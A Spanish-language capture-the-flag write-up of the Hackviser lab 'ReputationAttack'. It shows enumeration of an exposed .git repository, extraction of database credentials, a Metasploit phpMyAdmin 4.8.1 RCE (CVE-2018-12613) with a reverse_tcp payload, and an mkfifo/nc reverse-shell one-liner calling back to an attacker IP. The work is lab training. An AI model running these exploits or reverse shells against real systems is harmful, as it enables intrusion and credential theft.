# Resolución maquina ReputationAttack

**Autor:** PepeMaquina  
**Fecha:** 15 de diciembre de 2025  
**Dificultad:** Easy  
**Sistema Operativo:** Linux  
**Tags:** Git, Mysql, CVE.

---
## Imagen de la Máquina

![](reputation.jpg)

*Imagen: ReputationAttack.JPG*
## Reconocimiento Inicial
### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 4000 -n -Pn 172.20.2.169 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p80,3306 172.20.2.169 -oN targeted
~~~
### Enumeración de Servicios
~~~bash
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
3306/tcp open   mysql   MariaDB 5.5.5-10.5.21
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.5.21-MariaDB-0+deb11u1
|   Thread ID: 662
|   Capabilities flags: 63486
|   Some Capabilities: LongColumnFlag, SupportsCompression, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: }2"OJc6!Clu(c>J9~0pd
|_  Auth Plugin Name: mysql_native_password
~~~
Un error mio fue que me olvide de escanear el puerto 80, pero tampoco es de mucha ayuda ya que se sabe que es http, fuera de ello tambien se ve el puerto 3306 que no deberia de estar expuesto.
### Enumeración de la página web
Para realizar la enumeración web, primero se coloca el dominio que nos entrega la maquina por defecto.
~~~bash
cat /etc/hosts
127.0.0.1 localhost
...............
172.20.2.169 foxxo9-blog.hv
~~~
Posteriormente, al revisar la pagina web se puede ver que no presenta cosa de gran interes, por lo que procedo a realizar enumeración de subdirectorios.
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/nmap]
└─$ feroxbuster -u http://foxxo9-blog.hv/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 5 -o fuzz -k 
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://foxxo9-blog.hv/
 🚀  Threads               │ 5
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ INFINITE
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://foxxo9-blog.hv/.git => http://foxxo9-blog.hv/.git/
200      GET       45l      347w     3495c http://foxxo9-blog.hv/p/1/the-5-secrets-to-becoming-a-legend-in-the-cyber-world-like-me
200      GET       43l       89w     1207c http://foxxo9-blog.hv/search.php
200      GET       50l       97w     1296c http://foxxo9-blog.hv/contact.php
...................................
<SNIP>
...................................
~~~
Realmente presenta una gran variedad y cantidad de subdirectorios, pero lo mas importante es que presenta un repositorio .git que no deberia de estar en ese lugar.
Para ello existen herramientas como "GitDumper" (https://github.com/arthaud/git-dumper) para ver todo el contenido de un .git mas ordenado.
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content/git-dumper]
└─$ python3 git_dumper.py http://foxxo9-blog.hv/.git ../project
[-] Testing http://foxxo9-blog.hv/.git/HEAD [200]
....................
<SNIP>
....................
~~~
Si existia bastante informacion, asi que revisando el contenido lo primero que salta a mi vista es revisar los archivos de configuracion y conexion a las bases de datos, ya que cuento con un puerto 3306 expuesto.
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content/project]
└─$ ls                   
admin.php       config.php   contact.php  footer.php          header.php     login.php   phpMyAdmin    trumbowyg.min.css  w3.css
categories.php  _config.yml  del.php      functions.php       index.php      logout.php  search.php    trumbowyg.min.js
cat.php         connect.php  edit.php     generate_slugs.php  jquery.min.js  new.php     security.php  view.php
                                                                                                                                                            
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content/project]
└─$ cat connect.php 
<?php
ob_start();
session_start();

$dbhost         = "localhost";
$dbuser         = "root";
$dbpass         = "f3f8-450d-8b25";
$dbname         = "newblog";
$charset        = "utf8";

$dbcon = mysqli_connect($dbhost, $dbuser, $dbpass);

if (!$dbcon) {
    die("Connection failed" . mysqli_connect_error());
}
mysqli_select_db($dbcon,$dbname);
mysqli_set_charset($dbcon,$charset)
~~~
Y efectivamente se puede ver unas credenciales que seguramente sirvan para la conexion con la base de datos.
La contraseña viene a ser la respuesta numero dos del laboratorio.
Para encontrar la primera respuesta utilizo el comando "grep".
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content/project]
└─$ grep -ri "@foxxo9-blog.hv"                     
.git/logs/HEAD:0000000000000000000000000000000000000000 f1292ae190b7449cd762a6214bd6a13dc23882c7 foxxo9 <foxxxo9@foxxo9-blog.hv> 1705691200 -0500       commit (initial): first commit
.git/logs/HEAD:f1292ae190b7449cd762a6214bd6a13dc23882c7 f1292ae190b7449cd762a6214bd6a13dc23882c7 foxxo9 <foxxxo9@foxxo9-blog.hv> 1705692522 -0500       rebase (start): checkout f1292ae190b7449cd762a6214bd6a13dc23882c7
.git/logs/HEAD:f1292ae190b7449cd762a6214bd6a13dc23882c7 f1292ae190b7449cd762a6214bd6a13dc23882c7 foxxo9 <foxxxo9@foxxo9-blog.hv> 1705692522 -0500       rebase (finish): returning to refs/heads/master
.git/logs/HEAD:f1292ae190b7449cd762a6214bd6a13dc23882c7 008ca1f3a577e8c9932a34aaff61f58ad65b9016 foxxo9 <foxxo9@foxxo9-blog.hv> 1705692748 -0500        commit (amend): first commit
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 f1292ae190b7449cd762a6214bd6a13dc23882c7 foxxo9 <foxxxo9@foxxo9-blog.hv> 1705691200 -0500      commit (initial): first commit
.git/logs/refs/heads/master:f1292ae190b7449cd762a6214bd6a13dc23882c7 008ca1f3a577e8c9932a34aaff61f58ad65b9016 foxxo9 <foxxo9@foxxo9-blog.hv> 1705692748 -0500       commit (amend): first commit
contact.php:        Contact: contact@foxxo9-blog.hv
~~~
Encontrando asi la respuesta que seria "contact@foxxo9-blog.hv"

### Explotar CVE-2018-12163
En este punto intente conectarme con la base de datos desde la consola.
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content/project]
└─$ mysql -u root -pf3f8-450d-8b25 -h 172.20.2.169
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
~~~
Pero esto pedia una autenticacion SSL, asi que no fue posible.
Pero recordando los archivos GIT que encontre, existia una carpeta "phpMyAdmin", eso viene a ser un gestor de base de datos relacionales, asi que teniendo las credenciales de la base de datos, seria la forma mas sencilla de establecer la conexión, la direccion vendria a ser "http://foxxo9-blog.hv/phpMyAdmin".
Se puede ver que las credenciales si funcionaron y se puede ver la base de datos.

![](reputation2.jpg)

Lo primero que se puede ver es una constraseña para el usuario admin, pero esa viene hasheada.
Al intentar descifrar la contraseña con hashcat tal parece que esto no es posible.
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content]
└─$ hashcat -m 3200 -a 0 hash_admin_mysql /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 5 2500U with Radeon Vega Mobile Gfx, 1467/2934 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

* Device #1: Not enough allocatable device memory or free host memory for mapping.

Started: Mon Dec 15 18:32:03 2025
Stopped: Mon Dec 15 18:33:01 2025
~~~
Por lo que otra opcion seria crear una nueva contraseña, revisando el codigo fuente se puede ver que para la contraseña se emplea la funcion "password_verify()"
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/content/project]
└─$ cat login.php 
<?php
require_once 'connect.php';
require_once 'header.php';

echo '<h2 class="w3-container w3-teal">Login</h2>';

if (isset($_POST['log'])) {
    $username = mysqli_real_escape_string($dbcon, $_POST['username']);
    $password = mysqli_real_escape_string($dbcon, $_POST['password']);

    $sql = "SELECT * FROM admin WHERE username = '$username'";

    $result = mysqli_query($dbcon, $sql);
    $row = mysqli_fetch_assoc($result);
    $row_count = mysqli_num_rows($result);


    if ($row_count == 1 && password_verify($password, $row['password'])) {
        $_SESSION['username'] = $username;
        header("location: admin.php");
    } else {
        echo "<div class='w3-panel w3-pale-red w3-display-container'>Incorrect username or password.</div>";
    }
}
    ?>

    <form action="" method="POST" class="w3-container w3-padding">
        <label>Username </label>
        <input type="text" name="username"  value="<?php if(isset($_POST['username'])){ echo strip_tags($_POST['username']);}?>" class="w3-input w3-border">
        <label>Password</label>
        <input type="password" name="password" class="w3-input w3-border">
        <p><input type="submit" name="log" value="Login" class="w3-btn w3-teal"></p>
    </form>

    <?php

Include("footer.php");
~~~
Por lo que podria utilizar la misma funcion de php para generar un nuevo hash de una contraseña conocida y poder reemplazarla. 

Eso seria una opción, pero revisando el codigo esto me lleva a una pagina "admin.php" que revisandola a fondo no me seria de gran ayuda para generar alguna reverse shell.

Asi que revisando la version de "phpMyAdmin" se ve que esta es la 4.8.1 y es vulnerable a un RCE.
Revisando el CVE, este es un CVE del 2018 y en mi experiencia no existen muchos exploits actualizados que funcionen correctamente, esto por incompatibilidad de versiones, por lo que la mejor opcion es usar METASPLOIT. Encontre un articulo que menciona como utilizar el exploit (https://medium.com/@souleimangeudi/phpmyadmin-4-8-0-4-8-1-authenticated-remote-code-execution-cve-2018-12613-239688d710e4).
Replicando, primero se abre msfconsole, y luego buscar el modulo "exploit/multi/http/phpmyadmin_lfi_rce".
~~~bash
msf > use exploit/multi/http/phpmyadmin_lfi_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
~~~
Porteriormente modificar las opciones con los datos de mi contexto, quedando asi.
~~~bash
msf exploit(multi/http/phpmyadmin_lfi_rce) > options

Module options (exploit/multi/http/phpmyadmin_lfi_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   f3f8-450d-8b25   no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, s
                                         apni
   RHOSTS     172.20.2.169     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phpMyAdmin/     yes       Base phpMyAdmin directory path
   USERNAME   root             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.13.128      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.
~~~
Para finalmente correlo y generar una reverse shell.
~~~bash
msf exploit(multi/http/phpmyadmin_lfi_rce) > run
[*] Started reverse TCP handler on 10.8.13.128:4444 
[*] Sending stage (41224 bytes) to 172.20.2.169
[*] Meterpreter session 1 opened (10.8.13.128:4444 -> 172.20.2.169:38012) at 2025-12-15 19:05:21 -0500
getuid

whoami
shell
[-] 172.20.2.169:80 - Failed to drop database ziacx. Might drop when your session closes.

meterpreter > getuid
Server username: www-data
~~~

En lo personal, no me gusta utilizar meterpeter, asi que genero una reverse shell a otro puerto.
~~~bash
meterpreter > shell
Process 1049 created.
Channel 2 created.
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.13.128 4433 >/tmp/f
~~~
Recibiendo una conexion exitosa.
~~~bash
┌──(kali㉿kali)-[~/hackviser/reputationAtack/exploits/CVE-2018-12613]
└─$ penelope -p 4433                                                                                            
[+] Listening for reverse shells on 0.0.0.0:4433 →  127.0.0.1 • 192.168.5.128 • 172.17.0.1 • 10.8.13.128
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from debian~172.20.2.169-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/debian~172.20.2.169-Linux-x86_64/2025_12_15-19_08_03-663.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@debian:/var/www/html/phpMyAdmin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~
Ahora el laboratorio pide otorgar el nombre completo del usuario "foxxo9", esto es facil con un simple cat al /etc/passwd.
~~~bash
www-data@debian:/home$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
hackviser:x:1000:1000:hackviser,,,:/home/hackviser:/bin/bash
foxxo9:x:1001:1001:Dexter Grayson,,,:/home/foxxo9:/bin/bash
~~~
De esa forma de obtiene la tercera respuesta "Dexter Grayson".

Finalmente nos pide el nombre el username de "breachforums" de las notas de Dexter.
Para ello se ve su directorio de trabajo en /home y se encuentra una nota con cuentas.
~~~bash
www-data@debian:/home$ cd foxxo9/
www-data@debian:/home/foxxo9$ cat accounts 
xss.is:shadow7zowie
nulled.to:shadow7zowie
breachforums.is:vortex5hpqh
exploit.in:blaze3boohoo
~~~
Obteniendo asi la ultima respuesta del laboratorio "vortex5hpqh".

***Este ejercicio no pide escalada de privilegios, asi que no la realizaremos. Enumerando por mi cuenta pude ver que no existe una forma directa de escalar asi que puede que no exista forma de escalar***









